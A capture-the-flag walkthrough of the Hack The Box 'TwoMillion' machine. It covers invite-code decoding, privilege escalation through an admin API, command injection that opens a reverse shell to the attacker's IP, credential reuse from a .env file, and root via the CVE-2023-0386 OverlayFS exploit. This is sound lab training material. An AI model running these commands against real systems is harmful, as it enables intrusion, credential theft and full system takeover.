# TwoMillion - Easy

```sh
sudo vim /etc/hosts
# map IP to twomillion.htb

nmap -T4 -p- -A -Pn -v twomillion.htb
```

* open ports & services:

* the webpage on port 80 redirects to domain '2million.htb' - update this entry in ```/etc/hosts```

* the webpage is a copy of 'Hack The Box' - we need to enumerate for clues

* the website gives an endpoint /invite - as a challenge - we can check this further

* /invite leads to an input form with a field for 'invite code' in order to sign up; as the website suggests, we need to hack our way in

* we also have a /login endpoint if we are already a member

* checking the source code of the /invite page, we have a JS script at /js/inviteapi.min.js - this is minified JS code - and a snippet of JS code in the webpage that verifies the invite code

* snippet of verification code:

    ```js
    $(document).ready(function() {
        $('#verifyForm').submit(function(e) {
            e.preventDefault()
            var code = $('#code').val();
            var formData = { "code": code }
            $.ajax({
                type: "POST",
                dataType: "json",
                data: formData,
                url: '/api/v1/invite/verify',
                success: function(response) {
                    if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                        // Store the invite code in localStorage
                        localStorage.setItem('inviteCode', code)
                        window.location.href = '/register';
                    } else {
                        alert("Invalid invite code. Please try again.");
                    }
                },
                error: function(response) {
                    alert("An error occurred. Please try again.");
                }
            });
        });
    });
    ```

    * this reads the input code & sends it in an AJAX POST request to /api/v1/invite/verify
    
    * if the endpoint returns the code as valid, the invite code is stored and we are redirected to /register

* checking the /register endpoint, it requires invite code as well, so we can check the minified JS code first

* the minified code uses the signature 'packed' function; we can use tools like [UnPacker](https://matthewfl.com/unPacker.html) to decode this, which gives us this snippet:

    ```js
    function verifyInviteCode(code)
        {
        var formData=
            {
            "code":code
        };
        $.ajax(
            {
            type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response)
                {
                console.log(response)
            }
            ,error:function(response)
                {
                console.log(response)
            }
        }
        )
    }
    function makeInviteCode()
        {
        $.ajax(
            {
            type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response)
                {
                console.log(response)
            }
            ,error:function(response)
                {
                console.log(response)
            }
        }
        )
    }
    ```

* to generate the invite code, it is sending a POST request to /api/v1/invite/how/to/generate endpoint - we can check this:

    ```sh
    curl 'http://2million.htb/api/v1/invite/how/to/generate' -X POST
    ```

* this gives us a JSON response with some encrypted data; the response also mentions ROT13

* if we use CyberChef to decode the data using ROT13, we get a clue - to generate the invite code, we need to make a POST request to /api/v1/invite/generate

* we can now generate the invite code:

    ```sh
    curl 'http://2million.htb/api/v1/invite/generate' -X POST
    ```

* this gives a JSON response with the encoded code; checking in CyberChef, this is base64 so we can decode it

* once decoded, we get the invite code - we can use this in /invite now

* once the invite code is submitted, we are redirected to /register - we can create a test account here and login

* the dashboard at /home is a clone of the HTB dashboard; the source code gives us some more endpoints:

    * /home/rules - lists rules for the platform
    * /home/changelog - lists changes done in versions
    * /home/access - includes connection settings details

* the website also mentions that due to ongoing DB migrations, some features would be unavailable

* checking the details in /access, it provides us a .ovpn file to connect to HTB network

* source code shows that it is these API endpoints -

    * /api/v1/user/vpn/download - for fetching the .ovpn file
    * /api/v1/user/vpn/generate - to generate the .ovpn file
    * /api/v1/user/vpn/regenerate - to revoke current .ovpn file and issue a new .ovpn file

* clicking on the download link for the connection pack gives us a .ovpn file:

    ```sh
    file test.ovpn

    cat test.ovpn
    ```

* the .ovpn file shows that it is connecting to host 'edge-eu-free-1.2million.htb' over UDP/1337; it also has certificate details

* while we cannot initiate a new connection using this .ovpn file, as it would not lead us anywhere (and because we would lose connection to this machine), we can check the API endpoints for any hidden/nested resources:

    ```sh
    curl 'http://2million.htb/api/' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv'
    # check the /api endpoint first
    # we get 301 Moved Permanently

    curl 'http://2million.htb/api/' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -L
    # -L to follow redirect
    # this leads to a 404 message
    # we can try with other request methods, but no clue

    ffuf -u 'http://2million.htb/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -t 25 -fs 162 -s
    # define filter settings
    # the cookie is not required, as it would still discover endpoints, but with 401 code instead of 200
    # this gives only /v1
    ```

    ```sh
    # fuzz /api/v1
    ffuf -u 'http://2million.htb/api/v1/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -t 25 -fs 162 -s
    # no endpoints found

    # check /api/v1 normally
    curl 'http://2million.htb/api/v1' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv'
    # this gives us a list of endpoints

    curl 'http://2million.htb/api/v1' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' | jq
    # prettified output
    ```

* a normal GET request to /api/v1 with the cookie value gives us a list of endpoints:

    ```json
    {
    "v1": {
        "user": {
        "GET": {
            "/api/v1": "Route List",
            "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
            "/api/v1/invite/generate": "Generate invite code",
            "/api/v1/invite/verify": "Verify invite code",
            "/api/v1/user/auth": "Check if user is authenticated",
            "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
            "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
            "/api/v1/user/vpn/download": "Download OVPN file"
        },
        "POST": {
            "/api/v1/user/register": "Register a new user",
            "/api/v1/user/login": "Login with existing user"
        }
        },
        "admin": {
        "GET": {
            "/api/v1/admin/auth": "Check if user is admin"
        },
        "POST": {
            "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
        },
        "PUT": {
            "/api/v1/admin/settings/update": "Update user settings"
        }
        }
    }
    }
    ```

* from these endpoints, we have a few admin API endpoints that can be checked -

    * /api/v1/admin/auth
    * /api/v1/admin/vpn/generate
    * /api/v1/admin/settings/update

    ```sh
    curl -i 'http://2million.htb/api/v1/admin/auth' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv'
    # -i to show response headers
    # this gives response - {"message":false}
    # check with other methods - this gives 405 Method Not Allowed

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv'
    # 405 Method Not Allowed

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST
    # 401 Unauthorized

    curl 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv'
    # 405 Method Not Allowed

    curl -i 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST
    # 405 Method Not Allowed
    # check with all possible methods

    curl -i 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X PUT
    # this gives 200 OK
    # we get response - {"status":"danger","message":"Invalid content type."}
    ```

* as /api/v1/admin/settings/update is the only endpoint with leads, we can continue checking on this; it is reporting invalid content type, so we can change it to json:

    ```sh
    curl -i 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X PUT -H 'Content-Type: application/json'
    # response - {"status":"danger","message":"Missing parameter: email"}

    curl -i 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X PUT -H 'Content-Type: application/json' -d '{"email":"test@email.com"}'
    # we can give the email we created
    # response - {"status":"danger","message":"Missing parameter: is_admin"}

    # we can try to give 'is_admin' as 'true'
    curl -i 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X PUT -H 'Content-Type: application/json' -d '{"email":"test@email.com", "is_admin":"true"}'
    # response - {"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}

    # we can set it to 1
    curl -i 'http://2million.htb/api/v1/admin/settings/update' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X PUT -H 'Content-Type: application/json' -d '{"email":"test@email.com", "is_admin":1}'
    # response - {"id":13,"username":"test","is_admin":1}
    ```

* as we get the updated response with 'is_admin' set to 1, we can verify now if our user has actually become an admin:

    ```sh
    curl -i 'http://2million.htb/api/v1/admin/auth' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv'
    # response - {"message":true}
    ```

* as we are an admin user, we can now attempt to interact with the /api/v1/admin/vpn/generate endpoint now:

    ```sh
    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST
    # 200 OK
    # response - {"status":"danger","message":"Invalid content type."}

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST -H 'Content-Type: application/json'
    # response - {"status":"danger","message":"Missing parameter: username"}

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST -H 'Content-Type: application/json' -d '{"username":"test"}'
    # we can give our test username here
    # this gives the complete .ovpn file as a response
    ```

* as the /api/v1/admin/vpn/generate endpoint is able to generate a complete .ovpn file from a POST request, we can check for any types of injection here (in case it is running ```openvpn``` in backend)

* for basic manual command injection testing, we can use [payload characters listed here](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/CommandInjections/README.md#exploitation) for injection and filter evasion

* testing with different payloads:

    ```sh
    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST -H 'Content-Type: application/json' -d '{"username":"test;id"}'
    # no response

    # to test for blind execution, we can check with 'ping' commands

    # setup listener for ICMP packets
    sudo tcpdump -i tun0 icmp

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST -H 'Content-Type: application/json' -d '{"username":"test;ping -c 2 10.10.14.34"}'
    # this works, and we can see ping packets

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST -H 'Content-Type: application/json' -d '{"username":"test`ping -c 2 10.10.14.34`"}'
    # other payload formats also work
    ```

* as we have RCE now, we can use this to get reverse shell:

    ```sh
    nc -nvlp 4444
    # setup listener

    curl -i 'http://2million.htb/api/v1/admin/vpn/generate' --cookie 'PHPSESSID=hl8k1qha7pdec2e7si781i50uv' -X POST -H 'Content-Type: application/json' -d '{"username":"test`busybox nc 10.10.14.34 4444 -e bash`"}'
    # this works
    ```

* in reverse shell:

    ```sh
    # stabilise shell

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # /var/www/html

    ls -la
    # enumerate all web files

    cat .env
    # gives DB details

    ls -la /home
    # we have 'admin' user
    ```

* from the '.env' file, we get the creds 'admin:SuperDuperPass123' for DB 'htb_prod', and the DB is running locally

* as we have an 'admin' user on the box, we can attempt to re-use these creds and login over SSH:

    ```sh
    ssh admin@2million.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # does not work

    # fetch linpeas from attacker for basic enum
    wget http://10.10.14.34:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 5.15.70-051570-generic, Ubuntu 22.04.2
    * a service is running locally on port 11211
    * Pkexec policy includes the config ```AdminIdentities=unix-group:sudo;unix-group:admin```
    * mail applications found at ```/var/mail/admin``` and ```/var/spool/mail/admin```

* checking the mails found at the above paths, we can see an internal email sent with the subject 'Urgent: Patch System OS'

* the email is to 'admin' user, and mentions about Linux kernel CVEs, and refers to OverlayFS/FUSE related exploits

* Googling about this, along with the Linux kernel info, leads to [CVE-2023-0386 - OverlayFS FUSE exploit](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)

* for the exploit, we can refer [this PoC of CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386):

    ```sh
    # on attacker
    # clone the repo
    https://github.com/sxlmnwb/CVE-2023-0386.git

    cd CVE-2023-0386

    python3 -m http.server
    # host the files
    ```

    ```sh
    # on target
    mkdir -p /tmp/cve-2023-0386

    cd /tmp/cve-2023-0386

    # fetch all files from the exploit folder
    wget -r http://10.10.14.34:8000/
    
    cd '10.10.14.34:8000'

    # follow the exploit

    make all
    # this compiles the code

    ./fuse ./ovlcap/lower ./gc
    # this starts the exploit
    ```

    ```sh
    # initiate another SSH session to target
    ssh admin@2million.htb

    cd '/tmp/cve-2023-0386/10.10.14.34:8000'

    ./exp
    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
